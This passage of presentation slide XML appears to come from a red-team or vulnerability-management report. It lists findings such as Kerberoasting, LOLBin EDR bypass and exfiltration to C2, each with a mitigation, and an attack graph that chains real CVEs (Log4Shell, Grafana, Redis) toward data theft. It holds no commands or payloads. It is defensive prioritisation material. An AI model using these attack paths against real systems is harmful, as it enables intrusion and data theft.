          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Exfiltration</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83" name="TextBox 82"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11045952" y="5212080"/>
            <a:ext cx="1188720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TA0010</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="84" name="TextBox 83"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11045952" y="5394960"/>
            <a:ext cx="1188720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="1E283C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Pending</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85" name="Rectangle 84"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="587044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28600" y="5907024"/>
            <a:ext cx="11731752" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  Critical Findings from RT-2026-02 (LockBit Ransomware Campaign)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87" name="Rectangle 86"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="6144768"/>
            <a:ext cx="2852928" cy="530352"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="180404"/>
          </a:solidFill>
          <a:ln w="508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20040" y="6172200"/>
            <a:ext cx="2670048" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Domain Admin via Kerberoasting in 8 minutes</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="89" name="TextBox 88"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="6419088"/>
            <a:ext cx="731520" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVSS 9.8</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="90" name="TextBox 89"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1097280" y="6419088"/>
            <a:ext cx="1892807" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>→ Enforce Kerberos AES-256. Disable RC4. Monitor SPN enumeration.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="91" name="Rectangle 90"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3218688" y="6144768"/>
            <a:ext cx="2852928" cy="530352"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="180404"/>
          </a:solidFill>
          <a:ln w="508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310128" y="6172200"/>
            <a:ext cx="2670048" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EDR bypassed using LOLBins (certutil, mshta)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="93" name="TextBox 92"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3310128" y="6419088"/>
            <a:ext cx="731520" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVSS 8.6</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="94" name="TextBox 93"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4087368" y="6419088"/>
            <a:ext cx="1892807" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>→ Enable script block logging. Restrict LOLBins via AppLocker.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="95" name="Rectangle 94"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="6144768"/>
            <a:ext cx="2852928" cy="530352"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="180404"/>
          </a:solidFill>
          <a:ln w="508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300216" y="6172200"/>
            <a:ext cx="2670048" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Lateral movement to 14 hosts in 22 minutes</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="97" name="TextBox 96"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6300216" y="6419088"/>
            <a:ext cx="731520" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVSS 9.1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="98" name="TextBox 97"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7077456" y="6419088"/>
            <a:ext cx="1892807" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>→ Enforce network segmentation. Disable NTLM relay.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="99" name="Rectangle 98"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9198864" y="6144768"/>
            <a:ext cx="2852928" cy="530352"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="180404"/>
          </a:solidFill>
          <a:ln w="508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290304" y="6172200"/>
            <a:ext cx="2670048" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2.4 GB exfiltrated over HTTPS to C2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="101" name="TextBox 100"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9290304" y="6419088"/>
            <a:ext cx="731520" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVSS 8.8</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="102" name="TextBox 101"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10067544" y="6419088"/>
            <a:ext cx="1892807" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>→ DLP policy. SSL inspection. Outbound DNS monitoring.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Attack Graph</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Auto-generated kill-chain graph from live CVE + asset data — visualises the exact attack path</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Attack Graph automatically builds a directed graph that maps how an attacker could move through GlobalShip Logistics' infrastructure, starting from the internet and reaching the most sensitive data. Nodes represent assets with their most critical unpatched CVE. Directed edges represent exploit paths — connections that are possible given network reachability and confirmed exploit confidence. The critical path (the shortest route from attacker to full compromise) is highlighted in red. This view is invaluable for prioritisation: it shows which single CVE, if patched, would break the most dangerous attack chain. The graph is rebuilt automatically every time a new CVE is added or a vulnerability's status changes.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="2194560"/>
            <a:ext cx="1572768" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="231010"/>
          </a:solidFill>
          <a:ln w="1270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2240280"/>
            <a:ext cx="1426464" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>INTERNET
(Attacker Origin)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Rectangle 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2103120" y="1554480"/>
            <a:ext cx="1572768" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="231010"/>
          </a:solidFill>
          <a:ln w="1270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1600200"/>
            <a:ext cx="1426464" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ERPNext
CVE-2021-44228
CVSS 10.0  RCE</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Rectangle 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2103120" y="3108960"/>
            <a:ext cx="1572768" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="231B05"/>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76272" y="3154680"/>
            <a:ext cx="1426464" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Grafana
CVE-2021-43798
CVSS 7.5  File Read</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Rectangle 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4389120" y="2331720"/>
            <a:ext cx="1572768" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="231010"/>
          </a:solidFill>
          <a:ln w="1270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2377440"/>
            <a:ext cx="1426464" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Redis
CVE-2022-0543
CVSS 10.0  RCE</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Rectangle 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="1691640"/>
            <a:ext cx="1572768" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="231B05"/>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56832" y="1737360"/>
            <a:ext cx="1426464" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PostgreSQL
CVE-2024-0985
CVSS 8.0  PrivEsc</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="3291840"/>
            <a:ext cx="1572768" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="231B05"/>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3337560"/>
            <a:ext cx="1426464" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Kafka Topics
CVE-2023-25194
No-Auth PII Read</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8778240" y="2468880"/>
            <a:ext cx="1572768" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="231010"/>
          </a:solidFill>
          <a:ln w="1270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51392" y="2514600"/>
            <a:ext cx="1426464" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>C2 / Exfil
External Server</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1938528" y="2395728"/>
            <a:ext cx="1508760" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="1">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>→ Log4Shell JNDI
reverse shell</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="TextBox 23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3675887" y="1901952"/>
            <a:ext cx="1508760" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="1">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>→ Cred dump via
path traversal</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3675887" y="3291840"/>
            <a:ext cx="1508760" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="1">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>→ Redis AUTH
bypass</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="TextBox 25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5961888" y="1874519"/>
            <a:ext cx="1508760" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="1">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>→ SQL dump
+ priv-esc</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="TextBox 26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5961888" y="3429000"/>
            <a:ext cx="1508760" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="1">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>→ Subscribe all
topics no-auth</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="TextBox 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8247888" y="2651760"/>
            <a:ext cx="1508760" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="1">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>→ Exfiltrate 50GB
over HTTPS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Rectangle 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10378440" y="1508760"/>
            <a:ext cx="1600200" cy="2926080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="1E28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1572768"/>
            <a:ext cx="1463040" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ANALYSIS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="TextBox 30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10442448" y="1828800"/>
            <a:ext cx="1463040" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Complexity</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
